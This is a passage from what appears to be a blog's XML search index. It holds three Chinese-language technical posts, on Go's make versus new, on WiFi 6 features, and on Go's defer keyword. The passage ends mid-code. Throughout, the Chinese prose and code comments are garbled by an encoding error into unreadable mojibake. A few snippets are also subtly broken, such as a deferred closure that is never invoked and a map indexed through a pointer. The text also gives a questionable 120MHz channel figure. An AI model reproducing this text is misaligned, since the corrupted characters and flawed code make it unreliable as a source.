    <content><![CDATA[<p>å½“æˆ‘ä»¬æƒ³è¦å¾—åˆ°ä¸€ä¸ªåˆ‡ç‰‡ã€å“ˆå¸Œè¡¨æˆ–è€… channel çš„å®ä¾‹ï¼Œæˆ‘ä»¬å¸¸ä½¿ç”¨ <code>make</code>ï¼›è€Œå¦‚æœæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>new</code>ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Age <span class="keyword">int8</span></span><br><span class="line">    Name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    s := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">    m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    i := <span class="built_in">new</span>(<span class="keyword">int</span>) <span class="comment">// i ä¸º *int ç±»å‹</span></span><br><span class="line">    pp := <span class="built_in">new</span>(Person) <span class="comment">// pp ä¸º *Person ç±»å‹</span></span><br><span class="line">    p := Person&#123;&#125; <span class="comment">// p ä¸º Person ç±»å‹å®ä¾‹</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>new</code> åªæ˜¯ç”³è¯·äº†ä¸€ç‰‡è¯¥ç±»å‹çš„å†…å­˜ç©ºé—´å¹¶å°†å…¶ç½® 0ï¼Œç„¶åè¿”å›æŒ‡å‘è¿™ä¸ªç©ºé—´çš„æŒ‡é’ˆï¼Œæ¢è¨€ä¹‹ï¼Œnew å¾—åˆ°çš„æŒ‡é’ˆæŒ‡å‘çš„æ˜¯è¯¥ç±»å‹çš„é›¶å€¼ï¼›è€Œ <code>make</code> åœ¨ç”³è¯·å†…å­˜çš„åŒæ—¶åˆå§‹åŒ–è¿™ä¸ªå†…ç½®çš„æ•°æ®ç»“æ„ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line">    nMap := <span class="built_in">new</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(mMap == <span class="literal">nil</span>)     <span class="comment">// false</span></span><br><span class="line">    fmt.Println(*nMap == <span class="literal">nil</span>)    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">    mMap[<span class="number">0</span>] = <span class="string">&quot;hello world&quot;</span></span><br><span class="line">    nMap[<span class="number">0</span>] = <span class="string">&quot;hello world&quot;</span>     <span class="comment">// panic: assignment to entry in nil map</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“ï¼š</p>
<ol>
<li><code>make</code> åªèƒ½ç”¨äºå†…ç½®çš„ mapã€sliceã€channel ç±»å‹ï¼Œ<code>new</code> å¯ä»¥ç”¨äºä»»ä½•ç±»å‹ </li>
<li><code>make</code> å¾—åˆ°ç±»å‹å®ä¾‹ï¼Œ<code>new</code> å¾—åˆ°ç±»å‹æŒ‡é’ˆ</li>
<li><code>make</code> åœ¨ç”³è¯·å†…å­˜åŒæ—¶åˆå§‹åŒ–å¯¹è±¡ï¼Œ<code>new</code> åªæ˜¯ç”³è¯·äº†ä¸€ç‰‡å†…å­˜å¹¶ä¸”å°†å…¶ç½®ä¸ºç±»å‹é›¶å€¼</li>
</ol>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è°ˆWiFi6</title>
    <url>/2020/07/30/%E6%B5%85%E8%B0%88WiFi6/</url>
    <content><![CDATA[<p>WiFi6 å¥½å¤„éƒ½æœ‰å•¥ï¼Ÿè°è¯´å¯¹äº†å°±ç»™ä»–ï¼</p>
<span id="more"></span>

<h2 id="ä»€ä¹ˆæ˜¯-WiFi6"><a href="#ä»€ä¹ˆæ˜¯-WiFi6" class="headerlink" title="ä»€ä¹ˆæ˜¯ WiFi6"></a>ä»€ä¹ˆæ˜¯ WiFi6</h2><p>WiFi æ ‡å‡†æ˜¯ IEEEï¼ˆç”µæ°”ç”µå­å·¥ç¨‹å¸ˆå­¦ä¼šï¼‰åˆ¶å®šçš„æ ‡å‡†ä¹‹ä¸€ï¼ŒIEEE å°†æœ€è¿‘å‡ ä»£çš„ WiFi æ ‡å‡†ä¾æ¬¡å‘½åä¸º 802.11n, 802.11ac, 802.11axã€‚WiFi è”ç›Ÿåˆ™æ˜¯ä¸€ä¸ªå•†ä¸šç»„ç»‡ï¼Œä¸»è¦ç›®çš„æ˜¯åœ¨å…¨çƒèŒƒå›´å†…æ¨è¡Œ WiFi äº§å“çš„å…¼å®¹è®¤è¯ï¼Œå‘å±• IEEE802.11 æ ‡å‡†çš„æ— çº¿å±€åŸŸç½‘æŠ€æœ¯ã€‚</p>
<p>2018å¹´åº•ï¼Œä¸ºäº†æ–¹ä¾¿å®£ä¼ ä¸æ¨å¹¿ï¼ŒWiFi è”ç›Ÿä¸º WiFi æ ‡å‡†æ¨å‡ºäº†æ›´ä¸ºç®€å•å¥½è®°çš„åå­—ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">802.11n = WiFi4</span><br><span class="line">802.11ac = WiFi5</span><br><span class="line">802.11ax = WiFi6</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/07/30/vNi1Pqt4cxpeC8A.png" alt="å„ç‰ˆæœ¬WiFiå¯¹æ¯”"></p>
<h2 id="OFDMA"><a href="#OFDMA" class="headerlink" title="OFDMA"></a>OFDMA</h2><p>ä½¿ç”¨ OFDMï¼Œ æ¯ä¸€å¸§æ•°æ®åªèƒ½æœåŠ¡ä¸€ä¸ªè®¾å¤‡ï¼›è€Œä½¿ç”¨ OFDMAï¼Œæ¯ä¸€å¸§æ•°æ®å¯ä»¥è¢«å¤šä¸ªè®¾å¤‡æ‰€ä½¿ç”¨ã€‚</p>
<p><img src="https://i.loli.net/2020/07/30/fAW9UZlwxkYJOPz.png" alt="OFDMä¸OFDMA"></p>
<p>ä¸€ä¸ªé€šä¿—çš„æ¯”å–»æ˜¯å¡è½¦ã€‚ä½¿ç”¨ OFDM å¡è½¦æ¯æ¬¡åªèƒ½ç»™ä¸€å®¶è¿è´§ï¼Œå³ä½¿è¿™æ¬¡è¿è¾“å¡è½¦æ²¡è£…æ»¡ã€‚è€Œ OFDMA ä¸€æ¬¡å¯ä»¥æŠŠä¸œè¥¿è¿ç»™å¤šå®¶ï¼Œè¿™æ ·å°±ä¸ä¼šæµªè´¹è¿åŠ›äº†ã€‚</p>
<p><img src="https://i.loli.net/2020/07/30/P92vCYuAUaTcMRb.png" alt="OFDMAå¡è½¦"></p>
<h2 id="MU-MIMO"><a href="#MU-MIMO" class="headerlink" title="MU-MIMO"></a>MU-MIMO</h2><p>ä¼ ç»Ÿçš„ SU-MIMO çš„è·¯ç”±å™¨ä¿¡å·å‘ˆä¸€ä¸ªç¯çŠ¶æ•£å‘ï¼Œæ ¹æ®è·ç¦»ä¾æ¬¡å•ç‹¬ä¸è®¾å¤‡è¿›è¡Œé€šè®¯ã€‚å½“æ¥å…¥è®¾å¤‡è¿‡å¤šä¼šå¯¼è‡´éƒ¨åˆ†è®¾å¤‡é•¿æœŸå¤„äºç­‰å¾…çŠ¶æ€ï¼Œé€ æˆæ‰€è°“â€œä¿¡å·æ»¡æ ¼ç½‘é€Ÿå¾ˆæ…¢â€çš„ç°è±¡ã€‚æ›´ä¸ºä¸¥é‡çš„æ˜¯ï¼Œæ¯æ¬¡é€šè®¯çš„å¸¦å®½ = æ€»å¸¦å®½ / æ¥å…¥è®¾å¤‡æ•°ã€‚è¿™æ ·å°±é€ æˆäº†å¤§é‡æµªè´¹ã€‚<br>è€Œ MU-MIMO è·¯ç”±å™¨å¯¹ä¿¡å·è¿›è¡Œé¢‘åˆ†ã€ç åˆ†ç­‰å¤ç”¨ï¼Œè¿™æ ·ä¸€å°æœ‰ n æ ¹å¤©çº¿çš„ MU-MIMO è·¯ç”±å™¨å¯ä»¥å’Œæœ€å¤š nå°è®¾å¤‡åŒæ—¶é€šè®¯ä¸”æ¯ä¸ªè®¾å¤‡éƒ½èƒ½æœ€å¤§é™åº¦åˆ©ç”¨é¢‘å®½ï¼Œæ•°æ®ä¼ è¾“é€Ÿç‡æé«˜äº† n å€ã€‚<br>æ”¯æŒ MU-MIMO çš„è·¯ç”±å™¨åŒæ—¶ä¸ SU-MIMO è®¾å¤‡å’Œ MU-MIMO è®¾å¤‡é€šä¿¡æ—¶ä¼šæ··ç€ç”¨è¿™ä¸¤ç§æŠ€æœ¯ã€‚ä¸¾ä¾‹æ¥è¯´è®¾å¤‡ 1 æ˜¯ SU-MIMOï¼Œè®¾å¤‡ 2ã€3 æ˜¯ MU-MIMOï¼Œé‚£ MU-MIMO è·¯ç”±å™¨å’Œ 1 é€šä¿¡æ—¶ä½¿ç”¨ SU-MIMOï¼Œå’Œ 2ã€3 é€šä¿¡æ—¶ä½¿ç”¨ MU-MIMOã€‚<br>MU-MIMO åªæ˜¯åˆ©ç”¨äº†ç©ºç½®çš„å¤©çº¿ï¼Œå¹¶ä¸ä¸€å®šå°±èƒ½æé«˜ wifi é€Ÿåº¦ã€‚å¦‚æœå½“å‰æ‰€æœ‰å¤©çº¿éƒ½è¢«åˆ©ç”¨ä¸Šäº†å†ä½¿ç”¨ MU-MIMO ä¹Ÿæ²¡æ•ˆæœã€‚æ¯”å¦‚ MU-MIMO è·¯ç”±å™¨ä¸ 3 å° MU-MIMO è®¾å¤‡ + 1 å° SU-MIMO è®¾å¤‡é€šä¿¡ï¼Œæ­¤æ—¶è·¯ç”±å™¨ 3 æ ¹å¤©çº¿éƒ½æ»¡è½½äº†ï¼ŒæŠŠé‚£ä¸€å° SU-MIMO å‡çº§æˆ MU-MIMO å¹¶ä¸ä¼šå¯¹ç½‘é€Ÿæœ‰æå‡ã€‚<br>ä¸ wifi 5 ç›¸æ¯” wifi6 çš„æå‡åœ¨äºæ”¯æŒä¸Šè¡Œ MU-MIMOï¼Œè¿™åœ¨ç”¨æˆ·ä¸Šä¼ æ•°æ®çš„æ—¶å€™å¾ˆæœ‰ç”¨</p>
<p><img src="https://i.loli.net/2020/07/30/CWQzdSU2youTrVx.png" alt="MU-MIMO"></p>
<h2 id="è°ƒåˆ¶æ¨¡å¼"><a href="#è°ƒåˆ¶æ¨¡å¼" class="headerlink" title="è°ƒåˆ¶æ¨¡å¼"></a>è°ƒåˆ¶æ¨¡å¼</h2><p>QAM æ˜¯ä¸€ç§åœ¨ä¸¤ä¸ªæ­£äº¤è½½æ³¢ä¸Šè¿›è¡Œå¹…åº¦è°ƒåˆ¶çš„è°ƒåˆ¶æ–¹å¼ï¼ŒxQAM ä»£è¡¨äº†ä¸€ä¸ªä¼ è¾“å•å…ƒå« x å­è½½æ³¢ï¼Œå³è·¯ç”±å™¨æ¯ä¸€å¸§æœ€å¤šèƒ½ä¼ è¾“å¤šå°‘æ•°æ®ã€‚</p>
<p><img src="https://i.loli.net/2020/07/30/Sx541NemKHCt8Jn.png" alt="QAM"></p>
<ul>
<li>WIFI5ï¼šæœ€é«˜ä¸º 256-QAMï¼Œä½†æ˜¯æœ‰æ•ˆå­è½½æ³¢æ•°é‡åªæœ‰ 234 ä¸ªã€‚ä½¿ç”¨ 160Mhz é¢‘å®½å°±æ˜¯ 468 ä¸ªã€‚</li>
<li>WIFI6ï¼šæœ€é«˜ä¸º1024-QAMï¼Œä½†æ˜¯æœ‰æ•ˆå­è½½æ³¢æ•°é‡çš„åªæœ‰ 980 ä¸ªã€‚ä½¿ç”¨ 160Mhz é¢‘å®½æ—¶å€™ä¸º 1960 ä¸ª</li>
</ul>
<p>WIFI5 ä¸€ä¸ªQAMä¼ è¾“ 8bit æ•°æ®ï¼ŒWIFI6 ç”¨çš„æ˜¯10Bitæ•°æ®ã€‚ä¸¤è€…æœ€é«˜é€Ÿåº¦æ—¶å€™çš„ç¼–ç ç‡éƒ½æ˜¯5/6ã€‚wifi6 æ¯å¸§ä¼ è¾“æ›´å¤šçš„æ•°æ®ï¼Œç”¨æˆ·æ„Ÿå—åˆ°çš„â€œç½‘é€Ÿâ€ä¹Ÿå°±å˜å¿«äº†ã€‚<br>åœ¨ 120MHz ä¸‹ wifi6 ç†è®ºä¸Šå•æµæœ€é«˜å¯è¾¾ 1021Mbpsï¼Œæé™ 8 ä¸²æµè¾¾åˆ° 9607Mbps(9.3Gbps)ã€‚å½“ç„¶ï¼Œå…·ä½“é€Ÿåº¦å¦‚ä½•è¿˜å—ç”¨æˆ·ç½‘ç»œå¸¦å®½ç­‰å› ç´ çš„é™åˆ¶ã€‚</p>
<h2 id="TWT"><a href="#TWT" class="headerlink" title="TWT"></a>TWT</h2><p>TWT(Target Wake Time) ä¸»è¦é¢å‘äºæ™ºèƒ½å®¶å±…äº§å“ï¼Œè¿™äº›è®¾å¤‡é€šè¿‡æ²Ÿé€šå‘Šè¯‰è·¯ç”±å™¨ä»€ä¹ˆæ—¶å€™å”¤é†’è®¾å¤‡ï¼Œå…¶ä»–æ—¶é—´ä¸è¦æ‰¾æˆ‘ï¼ˆç»´æŒwifiè¿æ¥ï¼‰ï¼Œé¿å…å¤šä¸ªè®¾å¤‡åŒæ—¶é€šä¿¡é€ æˆç­‰å¾…ï¼Œå‡å°‘æ— çº¿ç½‘ç»œå¤©çº¿ä½¿ç”¨åŠä¿¡å·æœç´¢æ—¶é—´ï¼Œè¿›è€Œå‡å°‘æ™ºèƒ½å®¶å±…äº§å“çš„è€—ç”µé—®é¢˜ã€‚ä½†è¯¥æŠ€æœ¯å¹¶ä¸æ˜¯å¯¹æ‰€æœ‰è®¾å¤‡éƒ½æœ‰å¸®åŠ©ï¼Œä¾‹å¦‚ç¬”è®°æœ¬ç”µè„‘éœ€è¦æŒç»­çš„äº’è”ç½‘è®¿é—®ï¼Œå› æ­¤ä¸å¤ªå¯èƒ½è¿‡å¤šåœ°å—ç›Šäºæ­¤åŠŸèƒ½ã€‚</p>
<p><img src="https://i.loli.net/2020/07/30/3AU7J1MhsSHRafY.png" alt="TWT"></p>
<h2 id="SR"><a href="#SR" class="headerlink" title="SR"></a>SR</h2><p>SR(spacial reuse) æŒ‡ç©ºé—´å¤ç”¨æŠ€æœ¯ï¼Œä½œç”¨æ˜¯å®ç°é«˜å¯†åº¦åœºæ™¯ä¸‹ï¼ˆç©ºé—´ä¸­åŒæ—¶å­˜åœ¨å¤šä¸ªè·¯ç”±ä¿¡å·ï¼‰çš„ä¿¡é“å¤ç”¨</p>
<p><img src="https://i.loli.net/2020/07/30/qdfQhs6vFXzpLik.png" alt="SR"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å½“å‰ä¸»æµè·¯ç”±å™¨å·²ç»æ”¯æŒ WiFi5ï¼Œç”±äº WiFi5 ä»…æ”¯æŒ 5G é¢‘æ®µï¼Œè€Œç°å®é‡Œè¿˜å­˜åœ¨ä¸å°‘åªæ”¯æŒ 2.4G é¢‘æ®µçš„è®¾å¤‡ï¼Œå› æ­¤è·¯ç”±å™¨ä¼šå‘ä¸‹å…¼å®¹ WiFi 4 çš„æ ‡å‡†ï¼Œä¹Ÿå°±æ˜¯å®ƒä»¬åœ¨ 2.4G é¢‘æ®µä½¿ç”¨çš„ WiFi4 ç¡®ä¿å‘ä¸‹å…¼å®¹ï¼Œåœ¨ 5G é¢‘æ®µåˆ™ä½¿ç”¨çš„ WiFi5ã€‚<br>WiFi6 åŒæ—¶æ”¯æŒ 2.4G å’Œ 5G é¢‘æ®µï¼Œè‹¥ WiFi6 è·¯ç”±å™¨å’Œæ”¯æŒ WiFi6 çš„ç»ˆç«¯æ™®åŠåï¼Œç»“åˆä¸Šæ–‡å†…å®¹ï¼Œé¢„è®¡å¸¦æ¥çš„å¢ç›Šæœ‰ï¼š</p>
<ol>
<li>é€Ÿåº¦æ›´å¿«ï¼Œå¯å°†æ— çº¿é€Ÿç‡æé«˜åˆ°æœ€é«˜9.6Gbpsï¼Œæ»¡è¶³é«˜é€Ÿç‡åº”ç”¨éœ€æ±‚ï¼Œä¸»è¦é€šè¿‡1024QAMã€160Mhzã€æ›´å¤šçš„ç©ºé—´æµç­‰å®ç°</li>
<li>å»¶è¿Ÿæ›´ä½ï¼Œé€šè¿‡MU-MIMOã€OFDMAå®ç°</li>
<li>ç½‘ç»œå®¹é‡æå‡ï¼Œå¯¹åŒæ—¶è¿æ¥å¤šè®¾å¤‡çš„åœºæ™¯æ”¯æŒæ›´å¥½ï¼Œé€šè¿‡MU-MIMOã€OFDMAå®ç°</li>
<li>ä¿¡å·æ›´åŠ ç¨³å®šï¼ŒæŠ—å¹²æ‰°èƒ½åŠ›å’Œè¦†ç›–èŒƒå›´å¢å¼ºï¼Œé€šè¿‡æ”¯æŒ 2.4G é¢‘æ®µã€SRç­‰å®ç°</li>
<li>æ­¤å¤–ï¼Œä¸ºäº†æ”¯æŒæ–°çš„æŠ€æœ¯ç‰¹æ€§ï¼ŒWiFi 6è·¯ç”±å™¨æœ¬èº«åœ¨ç¡¬ä»¶è§„æ ¼ï¼ˆå¤„ç†å™¨ã€å†…å­˜ç­‰ï¼‰ä¸Šä¹Ÿä¼šæœ‰æå‡ï¼Œç¡¬ä»¶ä¸Šçš„æå‡ä¹Ÿä¼šå¸¦æ¥å„æ–¹é¢æ›´å¥½çš„æ•ˆæœï¼Œæ‰€ä»¥å¯¹äºä¸æ”¯æŒ WiFi6 çš„è®¾å¤‡ä¹Ÿæœ‰ä¸€å®šå¢ç›Š</li>
</ol>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>ç¡¬ä»¶</tag>
      </tags>
  </entry>
  <entry>
    <title>Goåº•å±‚å¤§å†’é™©ä¹‹defer</title>
    <url>/2020/07/09/Go%E5%BA%95%E5%B1%82%E5%A4%A7%E5%86%92%E9%99%A9%E4%B9%8Bdefer/</url>
    <content><![CDATA[<h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><p>ä¸ Python ä¸­çš„ <code>with</code> ç±»ä¼¼ï¼ŒGolang ä½¿ç”¨ <code>defer</code> å…³é”®å­—æ›¿æˆ‘ä»¬ç®¡ç†å‡½æ•°çš„é€€å‡ºæ—¶çš„æ¸…é™¤æ“ä½œã€‚ä¸€ä¸ªç»å…¸çš„ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CopyFile</span><span class="params">(dstName, srcName <span class="keyword">string</span>)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span> &#123;</span><br><span class="line">    src, err := os.Open(srcName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dst, err := os.Create(dstName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    written, err = io.Copy(dst, src)</span><br><span class="line">    dst.Close()</span><br><span class="line">    src.Close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™æ®µä»£ç æœ‰ä¸ª bug å°±æ˜¯å¦‚æœ <code>os.create</code> è°ƒç”¨å¤±è´¥ï¼Œæ•´ä¸ªå‡½æ•°ä¼šç›´æ¥ returnï¼Œç„¶è€Œæ­¤æ—¶ src çš„æ–‡ä»¶æè¿°ç¬¦å¹¶æ²¡æœ‰å…³é—­ã€‚å½“ç„¶åœ¨ return å‰è°ƒç”¨ä¸€æ¬¡ src.Clouse å¯ä»¥è§£å†³é—®é¢˜ã€‚ç„¶è€Œä¸€æ—¦é¡¹ç›®å˜å¾—å¤æ‚ï¼Œè¿™ç§éšæ™¦çš„é—®é¢˜å°±ä¸å®¹æ˜“è¢«æ³¨æ„åˆ°ã€‚å› æ­¤ï¼Œ<code>defer</code> ä¾¿åº”è¿è€Œç”Ÿäº†ã€‚æŠŠå…³é—­æ–‡ä»¶æè¿°ç¬¦è¿™ä¸ªæ“ä½œäº¤ç»™è¿è¡Œæ—¶å»ç®¡ç†ï¼Œæˆ‘ä»¬å°±ä¸ç”¨æ‹…å¿ƒä¼šå‘ç”Ÿèµ„æºæ³„éœ²äº†ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CopyFile</span><span class="params">(dstName, srcName <span class="keyword">string</span>)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span> &#123;</span><br><span class="line">    src, err := os.Open(srcName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> src.Close()</span><br><span class="line"></span><br><span class="line">    dst, err := os.Create(dstName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> dst.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> io.Copy(dst, src)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¤äººäº‘ï¼šdefer å¥½ï¼Œdefer å¦™ï¼Œdefer æ£’çš„å‘±å‘±å«ã€‚ä½†å…¶å®åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¹Ÿæœ‰å‡ ä¸ªå¿…é¡»è¦æ³¨æ„çš„ç‚¹ï¼š</p>
<ul>
<li>defer å‡½æ•°çš„å‚æ•°ä¼šè¢«é¢„è®¡ç®—ã€‚æ¢è¨€ä¹‹ï¼Œ<strong>defer å‡½æ•°çš„å‚æ•°å€¼åœ¨å…¶æ³¨å†Œæ—¶å°±å·²ç»ç¡®å®šäº†</strong>ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼ŒA ä¸­çš„ defer å‡½æ•°åœ¨æ³¨å†Œæ—¶å°±æ‰§è¡Œäº† <code>time.Since(startedAt)</code> å¹¶è¿›è¡Œä¼ å‚ï¼›è€Œ B æ³¨å†Œäº†ä¸€ä¸ªé—­åŒ…ï¼Œ<code>time.Since(startedAt)</code> åœ¨ defer å‡½æ•°ä¸­æ‰æ‰§è¡Œã€‚æ€»ç»“èµ·æ¥å°±æ˜¯ï¼šåœ¨ defer å‡½æ•°å£°æ˜æ—¶ï¼Œå¯¹å¤–éƒ¨å˜é‡çš„å¼•ç”¨æœ‰ä¸¤ç§æ–¹å¼ï¼šä½œä¸ºå‡½æ•°å‚æ•° or ä½œä¸ºé—­åŒ…å¼•ç”¨ã€‚ä½œä¸ºå‡½æ•°å‚æ•°ï¼Œåˆ™åœ¨ defer å£°æ˜æ—¶å°±æŠŠå€¼ä¼ ç»™ deferï¼›ä½œä¸ºé—­åŒ…å¼•ç”¨ï¼Œåˆ™ä¼šåœ¨ defer å‡½æ•°æ‰§è¡Œæ—¶æ ¹æ®æ•´ä¸ªä¸Šä¸‹æ–‡ç¡®å®šå½“å‰çš„å€¼ã€‚ï¼š</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//output: 0s</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">A</span><span class="params">()</span></span> &#123;</span><br><span class="line">    startedAt := time.Now()</span><br><span class="line">    <span class="keyword">defer</span> fmt.Println(time.Since(startedAt))</span><br><span class="line"></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output: 1s</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">B</span><span class="params">()</span></span> &#123;</span><br><span class="line">    startedAt := time.Now()</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(time.Since(startedAt))</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>defer å‡½æ•°æ ¹æ®åè¿›å…ˆå‡ºï¼ˆLast In First Outï¼‰çš„åŸåˆ™è°ƒç”¨ï¼š</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">b</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">defer</span> fmt.Print(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// output: 3210</span></span><br></pre></td></tr></table></figure>

<ul>
<li>defer å‡½æ•°å¯ä»¥è¯»å–å’Œä¿®æ”¹<strong>å‘½å</strong>è¿”å›å€¼ï¼š</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">c</span><span class="params">()</span> <span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">         i++</span><br><span class="line">     &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125; <span class="comment">// i ä¸º 2</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè¿‡ç¨‹è¢«æ‹†è§£å¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">c</span><span class="params">()</span> <span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    i = <span class="number">1</span>         <span class="comment">// ç»™å‘½åè¿”å›å€¼èµ‹å€¼</span></span><br><span class="line">    i++           <span class="comment">// å‡½æ•°è¿”å›å‰æ’å…¥ defer å‡½æ•°ï¼Œå°† i åŠ ä¸€</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯<em>å› ä¸º return è¯­å¥å…ˆç»™å‘½åè¿”å›å€¼èµ‹å€¼ï¼Œå†æ‰§è¡Œ defer ä¸­çš„å‡½æ•°ï¼ˆå‘½åè¿”å›å€¼åœ¨å»¶è¿Ÿå‡½æ•°å‰å£°æ˜ï¼Œæ•…å»¶è¿Ÿå‡½æ•°å¯ä»¥å¯¹å…¶è¿›è¡Œæ“ä½œï¼‰ï¼Œæœ€åç”¨ ret æŒ‡ä»¤é€€å‡º</em>ã€‚å¦‚æœæ˜¯åŒ¿åè¿”å›å€¼ï¼Œå…¶åœ¨ defer è¯­å¥å‰æ²¡æœ‰å£°æ˜ï¼Œå»¶è¿Ÿå‡½æ•°ä¹Ÿå°±æ— ä»æ”¹å˜å®ƒçš„å€¼ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">d</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    i := <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        i = <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">&#125; <span class="comment">// i ä¸º 1</span></span><br></pre></td></tr></table></figure>

<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>å…ˆæ¥çœ‹ä¸€ä¸‹ defer å…³é”®å­—åœ¨ go ä¸­å¯¹åº”çš„ç»“æ„ä½“ <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a>ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> _defer <span class="keyword">struct</span> &#123;</span><br><span class="line">    siz       <span class="keyword">int32</span></span><br><span class="line">    heap      <span class="keyword">bool</span></span><br><span class="line">    openDefer <span class="keyword">bool</span></span><br><span class="line">    sp        <span class="keyword">uintptr</span></span><br><span class="line">    pc        <span class="keyword">uintptr</span></span><br><span class="line">    fn        *funcval</span><br><span class="line">    _panic    *_panic</span><br><span class="line">    link      *_defer</span><br><span class="line">    ...</span><br><span 